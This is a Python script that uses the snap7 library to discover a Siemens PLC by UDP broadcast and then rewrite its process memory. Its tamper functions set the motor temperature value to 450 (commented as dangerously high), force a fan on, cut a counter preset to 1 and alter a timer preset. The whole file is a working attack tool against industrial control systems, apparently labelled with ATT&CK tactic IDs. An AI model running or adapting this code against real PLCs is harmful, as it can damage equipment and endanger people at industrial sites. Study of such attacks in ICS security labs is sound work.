import snap7
import struct
import time
import socket

# Configuration
PLC_IP = None  # Will be discovered
RACK = 0
SLOT = 1
MOTOR_TEMP_ADDRESS = 7  # MW7 - Offset within the PLC's memory
FAN_A_ADDRESS = 0 #M0.0
FAN_B_ADDRESS = 1 #M0.1
DATA_BLOCK_ADDRESS_COUNTER = 100 # IEC_COUNTER_0_DB address (example)
DATA_BLOCK_ADDRESS_TIMER_0_1 = 102 # IEC_TIMER_0_DB_1 address (example)
DATA_BLOCK_ADDRESS_TIMER_0 = 104 # IEC_TIMER_0_DB address (example)
DATA_BLOCK_ADDRESS_TIMER_2 = 106 # IEC_TIMER_0_DB_2 address (example)
DATA_BLOCK_ADDRESS_TIMER_3 = 108 # IEC_TIMER_0_DB_3 address (example)
DATA_BLOCK_ADDRESS_TIMER_4 = 110 # IEC_TIMER_0_DB_4 address (example)
DB_SIZE_COUNTER = 20
DB_SIZE_TIMER = 20

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by scanning the local network.
    This is a rudimentary approach and may not work in all network configurations.
    Consider using more sophisticated discovery methods for production environments.
    """
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)  # Set a timeout for the scan

        # Bind to any available address and port
        sock.bind(('', 0))

        # Construct a simple discovery message (can be anything relevant to your PLC)
        discovery_message = b"Siemens PLC Discovery"

        # Broadcast the message on the local network
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.sendto(discovery_message, ('<broadcast>', 34964))  # Use Siemens default port or other appropriate port

        print("Scanning for PLC on the local network...")

        # Listen for responses
        while True:
            try:
                data, addr = sock.recvfrom(1024)
                print(f"Received response from: {addr[0]}")
                # Check if the response indicates a Siemens PLC (e.g., by checking for specific data)
                if b"Siemens" in data:
                    print(f"Siemens PLC found at IP: {addr[0]}")
                    return addr[0]
            except socket.timeout:
                print("No PLC found within the timeout period.")
                return None  # Or handle the failure appropriately

    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None
    finally:
        sock.close()

def read_memory_area(plc, area, db_number, start, size):
    """Reads a memory area from the PLC.

    Args:
        plc: The Snap7 client object.
        area: The memory area (e.g., snap7.consts.S7AreaMB for memory bits).
        db_number: The DB number (0 for non-DB areas).
        start: The starting address.
        size: The number of bytes to read.

    Returns:
        A bytearray containing the data read from the PLC.
    """
    return plc.read_area(area, db_number, start, size)


def write_memory_area(plc, area, db_number, start, data):
    """Writes data to a memory area in the PLC.

    Args:
        plc: The Snap7 client object.
        area: The memory area (e.g., snap7.consts.S7AreaMB for memory bits).
        db_number: The DB number (0 for non-DB areas).
        start: The starting address.
        data: A bytearray containing the data to write.
    """
    plc.write_area(area, db_number, start, data)


def read_int(byte_array, byte_index):
    """Reads an integer from a byte array."""
    return struct.unpack(">h", byte_array[byte_index:byte_index+2])[0]


def write_int(byte_array, byte_index, int_value):
    """Writes an integer to a byte array."""
    struct.pack_into(">h", byte_array, byte_index, int_value)


def read_bool(byte_array, byte_index, bit_index):
    """Reads a boolean value from a byte array."""
    byte_value = byte_array[byte_index]
    return (byte_value >> bit_index) & 1


def write_bool(byte_array, byte_index, bit_index, bool_value):
    """Writes a boolean value to a byte array."""
    byte_value = byte_array[byte_index]
    if bool_value:
        byte_value |= (1 << bit_index)  # Set the bit
    else:
        byte_value &= ~(1 << bit_index) # Clear the bit
    byte_array[byte_index] = byte_value


def tamper_with_motor_temp(plc, new_temp):
    """Modifies the Motor_Temp value in the PLC's memory."""
    try:
        # Read the current byte
        read_data = read_memory_area(plc, snap7.consts.S7AreaMW, 0, MOTOR_TEMP_ADDRESS, 2)
        print(f"Original Motor_Temp: {read_int(read_data, 0)}")

        # Create a byte array to hold the new integer value.
        new_data = bytearray(2)
        write_int(new_data, 0, new_temp)

        # Write the modified byte back to the PLC.
        write_memory_area(plc, snap7.consts.S7AreaMW, 0, MOTOR_TEMP_ADDRESS, new_data)

        # Verify the change
        read_data = read_memory_area(plc, snap7.consts.S7AreaMW, 0, MOTOR_TEMP_ADDRESS, 2)
        print(f"Modified Motor_Temp to: {read_int(read_data, 0)}")

    except Exception as e:
        print(f"Error tampering with Motor_Temp: {e}")


def tamper_with_fan_activation(plc, fan_to_control, new_state):
    """Modifies the fan activation state in the PLC's memory."""
    try:
        # Determine the memory address for the fan
        if fan_to_control.upper() == "A":
            address = FAN_A_ADDRESS
        elif fan_to_control.upper() == "B":
            address = FAN_B_ADDRESS
        else:
            print("Invalid fan selection. Choose 'A' or 'B'.")
            return

        # Read the current byte
        read_data = read_memory_area(plc, snap7.consts.S7AreaM, 0, 0, 1) # Read first byte of Memory Area (M0.0 is in here)

        # Get current fan state
        current_state = read_bool(read_data, 0, address)
        print(f"Original Fan {fan_to_control} state: {current_state}")

        # Write to fan bit (in the data we read)
        write_bool(read_data, 0, address, new_state)
        write_memory_area(plc, snap7.consts.S7AreaM, 0, 0, read_data)

        # Verify the change
        read_data = read_memory_area(plc, snap7.consts.S7AreaM, 0, 0, 1) # Read again
        changed_state = read_bool(read_data, 0, address) #get boolean
        print(f"Modified Fan {fan_to_control} to: {changed_state}")

    except Exception as e:
        print(f"Error tampering with Fan {fan_to_control}: {e}")


def tamper_with_counter_preset(plc, new_pv):
     """Modifies the preset value (PV) of the IEC_Counter_0_DB counter in the PLC."""
     try:
         # Read the current data block
         db_data = read_memory_area(plc, snap7.consts.S7AreaDB, DATA_BLOCK_ADDRESS_COUNTER, 0, DB_SIZE_COUNTER)
         print(f"Original IEC_Counter_0_DB.PV: {struct.unpack_from('>h', db_data, offset=16)[0]}")

         # Modify the preset value (PV), which is a short integer (2 bytes) located at offset 16 in the DB.
         struct.pack_into('>h', db_data, 16, new_pv)

         # Write the modified data back to the PLC
         write_memory_area(plc, snap7.consts.S7AreaDB, DATA_BLOCK_ADDRESS_COUNTER, 0, db_data)

         # Verify the change
         db_data = read_memory_area(plc, snap7.consts.S7AreaDB, DATA_BLOCK_ADDRESS_COUNTER, 0, DB_SIZE_COUNTER)
         print(f"Modified IEC_Counter_0_DB.PV to: {struct.unpack_from('>h', db_data, offset=16)[0]}")

     except Exception as e:
         print(f"Error tampering with IEC_Counter_0_DB.PV: {e}")


def tamper_with_timer_preset(plc, timer_db_address, new_pt):
    """Modifies the preset time (PT) of a timer DB in the PLC.

    Args:
        plc: The Snap7 client object.
        timer_db_address: The DB number of the timer.
        new_pt: The new preset time in milliseconds.
    """
    try:
        # Read the current data block for the timer
        db_data = read_memory_area(plc, snap7.consts.S7AreaDB, timer_db_address, 0, DB_SIZE_TIMER)

        # Read the current timer
        current_pt = struct.unpack_from('>i', db_data, offset=2)[0]
        print(f"Original PT: {current_pt} ms")

        # Construct a byte array from the integer milliseconds value, representing the new timer
        struct.pack_into('>i', db_data, 2, new_pt)

        # Write the modified data back to the PLC
        write_memory_area(plc, snap7.consts.S7AreaDB, timer_db_address, 0, db_data)

        # Verify the change
        db_data = read_memory_area(plc, snap7.consts.S7AreaDB, timer_db_address, 0, DB_SIZE_TIMER)
        print(f"Modified PT to: {struct.unpack_from('>i', db_data, offset=2)[0]} ms")

    except Exception as e:
        print(f"Error tampering with Timer PT: {e}")


def main():
    global PLC_IP

    # Discover the PLC IP address
    PLC_IP = find_plc_ip()

    if not PLC_IP:
        print("PLC IP address not found.  Exiting.")
        return

    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, RACK, SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        # Example 1: Tamper with Motor_Temp (TA0009)
        new_temperature = 450  # Set a dangerously high temperature
        tamper_with_motor_temp(plc, new_temperature)

        # Example 2: Force activate Fan B (TA0009)
        tamper_with_fan_activation(plc, "B", True)

        # Example 3: Shorten the counter preset time
        new_pv = 1 # Shorten the counter value
        tamper_with_counter_preset(plc, new_pv)

        #Example 4: Modify Timer value for Fan A timer
        new_timer_value = 5000 #5 seconds
        tamper_with_timer_preset(plc, DATA_BLOCK_ADDRESS_TIMER_0_1, new_timer_value)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()